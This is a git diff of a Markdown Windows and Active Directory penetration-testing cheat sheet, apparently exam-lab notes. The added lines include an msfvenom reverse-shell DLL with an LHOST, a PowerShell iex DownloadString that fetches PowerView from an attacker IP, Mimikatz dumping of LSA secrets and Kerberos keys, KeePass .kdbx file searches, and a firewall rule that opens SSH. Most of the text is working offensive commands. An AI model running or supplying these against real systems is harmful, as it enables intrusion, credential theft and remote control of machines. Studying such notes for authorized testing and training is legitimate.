@@ -18,6 +18,7 @@ There are several key pieces of information we should always obtain:
 > whoami /groups
 > net user
 > net user steve
+> Get-ChildItem Env: # Environment Variables
 > Get-LocalUser
 > Get-LocalGroup # Look at the different groups on the current workstation. Members of Remote Desktop Users can access the system with RDP, while members of Remote Management Users can access it with WinRM.
 > Get-LocalGroupMember adminteam
@@ -35,13 +36,13 @@ There are several key pieces of information we should always obtain:
 # However, the listed applications from above may not be complete. For example, this could be due to an incomplete or flawed installation process. Therefore, we should always check 32-bit and 64-bit Program Files directories located in C:\. Additionally, we should review the contents of the Downloads directory of our user to find more potential programs.
 > dir "C:\Program Files"
 > dir "C:\Program Files (x86)"
-> dir "C:\Users\CurrentUser\Downloads"
+> dir "C:\Users\jim\Downloads"
 # While it is important to create a list of installed applications on the target system, it is equally important to identify which of them are currently running. 
 > Get-Process
 > Get-Process NonStandardProcess | Select-Object Path # Get the path of the process
 # Sensitive information may be stored in meeting notes, configuration files, or onboarding documents. With the information we gathered in the situational awareness process, we can make educated guesses on where to find such files.
 > Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
-> Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
+> Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*kdbx -File -Recurse -ErrorAction SilentlyContinue
 # If you get access to the machine through another user, then restart the file search, as permissions may have changed
 > Get-ChildItem -Path C:\ -Include local.txt,proof.txt -File -Recurse -ErrorAction SilentlyContinue | type # Great, but only for CTFs, probably shouldn't get used to it
 > findstr /spin “password” *.* # find all files with the word "password" in them
@@ -100,8 +101,7 @@ powershell -ep bypass
 # Find out if you have admin privileges on any computers in the domain
 > Find-LocalAdminAccess # May take a few minutes
 # See who's logged in & other info
-> Get-NetSession -ComputerName web04 -Verbose # Untrustable on Wi
-ndows 11
+> Get-NetSession -ComputerName web04 -Verbose # Untrustable on Windows 11
 # This is more reliable, look for admins to be logged on machines, either to collect their NTLM hash or to impersonate commands running as him
 > .\PsLoggedOn.exe \\file04
 # Another way to get logged on users, needs local admins rights
@@ -135,7 +135,7 @@ Note that SharpHound supports looping, running cyclical queries over time like a
 ```bash
 > . .\Sharphound.ps1 # or Import-Module .\SharpHound.ps1
 > Get-Help Invoke-BloodHound
-> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\Public\Desktop\ -OutputPrefix "web02-nt" # May take a couple minutes
+> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\Public\Desktop\ -OutputPrefix "dev04-leon" # May take a couple minutes
 ```
 
 ```bash
@@ -216,6 +216,13 @@ PS C:\Users\steve>
 Once the password is entered, a new command line window appears. The title of the new window states running as CLIENTWK220\backupadmin.
 
 Use whoami to confirm the command line is working and we are indeed backupadmin.
+
+#### Windows' Grep (With Context)
+
+```bash
+> schtasks /query /fo LIST | Select-String -Pattern 12 -Context 4,4
+> Get-Content file.txt | Select-String -Pattern OS -Context 2,4
+```
 
 #### schtasks
 
@@ -311,7 +318,7 @@ In general, you need to collect the following three pieces of informaiton to cre
 	2. Domain SID
 	3. Target SPN
 
-If you are a local Administrator on this machine where iis_service (the SPN) has an established session, we can use Mimikatz to retrieve the SPN password hash (NTLM hash of iis_service). If you have the password, you can generate the NTML hash with codebeautify.org.
+If you are a local Administrator on this machine where iis_service (the SPN) has an established session, we can use Mimikatz to retrieve the SPN password hash (NTLM hash of iis_service). If you have the password, you can generate the NTLM hash with codebeautify.org.
 
 ```bash
 mimikatz # privilege::debug
@@ -395,12 +402,6 @@ Search in \\web02.medtech.com\sysvol\medtech.com\policies\*.xml, C:\ProgramData\
 
 NTLM hashes can be passed, NTLMv2 hashes CANNOT be passed.
 
-#### Windows' Grep (With Context)
-
-```bash
-> schtasks /query /fo LIST | Select-String -Pattern 12 -Context 4,4
-> Get-Content file.txt | Select-String -Pattern OS -Context 2,4
-```
 
 #### Execution Policy Bypass - Per User Basis
 
@@ -578,7 +579,12 @@ Get-ModifiableServiceFile
 Invoke-AllChecks
 ```
 
+#### Path Injection
+
+If you see any instance where a script or a cronjob does not specify the full path of a binary, whether it be Windows or Linux, the first thing that should come to mind is path injection. 
+
 ### Service DLL Hijacking
+
 
 ```bash
 # Check what binaries are running, as before
@@ -612,6 +618,17 @@ If you have read and execute permissions (RX), then see if there is a missing DL
 You can use Process Monitor to display real-time information about any process, thread, file system, or registry related activities. Our goal is to identify all DLLs loaded by BetaService as well as detect missing ones. Once we have a list of DLLs used by the service binary, we can check their permissions and if they can be replaced with a malicious DLL. Alternatively, if find that a DLL is missing, we could try to provide our own DLL by adhering to the DLL search order.
 
 Since you need administritave privileges to run Process Monitor, it's standard practice to copy the service binary to a local machine. On this system, we can install the service locally and use Process Monitor with administrative privileges to list all DLL activity.
+
+```bash
+sc create SchedulerService binPath= "C:\Windows\Tasks\scheduler.exe" DisplayName= "Scheduler Service" start= auto
+```
+
+Note that you can create a reverse shell dll:
+
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.231 LPORT=443 -f dll -o beyondhelper.dll
+```
+
 Browse in the Windows Explorer to C:\tools\Procmon\ and double-click on Procmon64.exe.
 
 We enter the following arguments: Process Name as Column, is as Relation, BetaServ.exe as Value, and Include as Action. Once entered, we'll click on Add.
@@ -807,6 +824,8 @@ privilege::debug # Test if ^ is the case
 log
 sekurlsa::logonpasswords # Who has been on the host machine?
 sekurlsa::msv
+sekurlsa::ekeys
+lsadump::lsa /inject
 lsadump::sam
 lsadump::secrets
 lsadump::cache
@@ -848,7 +867,6 @@ proxychains -q crackmapexec smb corp.com --kerberos --continue-on-success # Must
 proxychains -q crackmapexec smb 10.10.10.1X/24
 # Add the FQNs to a targets file
 ...
-
 # Retrieve hashes from password
 proxychains crackmapexec smb dev02-corp -u Administrator -p Password123! --local-auth --lsa
 
@@ -860,7 +878,7 @@ proxychains crackmapexec smb web02-corp -u Matthew.Lucas -H 5bcoe56i4645ho43h2ei
 
 ```bash
 # Import the PowerView module
-iex (new-object net.webclient).DownloadString('http://192.168.119.139/PowerView.ps1')
+iex (new-object net.webclient).DownloadString('http://192.168.45.231/PowerView.ps1')
 
 # Convert the new password to a secure string                                  
 $UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force      
@@ -929,7 +947,7 @@ Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
 #### RDP From PowerShell
 
 ```bash
-Start-Process "$env:windir\system32\mstsc.exe" -ArgumentList "/v:client01.medtech.com"
+Start-Process "$env:windir\system32\mstsc.exe" -ArgumentList "/v:172.16.173.7"
  ```
 
  #### Pass the Hash
@@ -949,7 +967,7 @@ Get-ChildItem -Path C:\Users -Recurse| Select-String -Pattern "password" | Selec
 #### For Modifiable Executables but Unknown Process, Watch What's Going on
 
 ```bash
-Get-Process | Watch-Command -Diff -Cont -Verbose
+Get-Process | Watch-Command -Difference -Continuous -Verbose
 Get-Process backup -ErrorAction SilentlyContinue | Watch-Command -Difference -Continuous -Verbose
 ```
 
@@ -958,3 +976,33 @@ Get-Process backup -ErrorAction SilentlyContinue | Watch-Command -Difference -Co
 ```bash
 icacls "C:\Windows\Tasks\file.log" /grant Everyone:F
 ```
+
+Do the following for ssh keys:
+
+```bash
+icacls "..\Documents\sarah_ssh.txt" /reset
+icacls "..\Documents\sarah_ssh.txt" /inheritance:r
+icacls "..\Documents\sarah_ssh.txt" /grant:r "$($env:USERNAME):(R)"
+```
+
+#### WinPeas Messed up Color
+
+This should fix it:
+
+```bash
+REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1 
+```
+
+#### Latest Good WinPeas release
+
+"https://github.com/peass-ng/PEASS-ng/releases/tag/20240221-e5eff12e"
+
+#### Open Port
+
+```bash
+New-NetFirewallRule -DisplayName "SSH" -Direction Inbound -Protocol TCP -LocalPort 22 -Action Allow
+```
+
+#### Privesccheck
+
+It was recommended to use this in addition to winpeas, 'https://github.com/itm4n/PrivescCheck'.
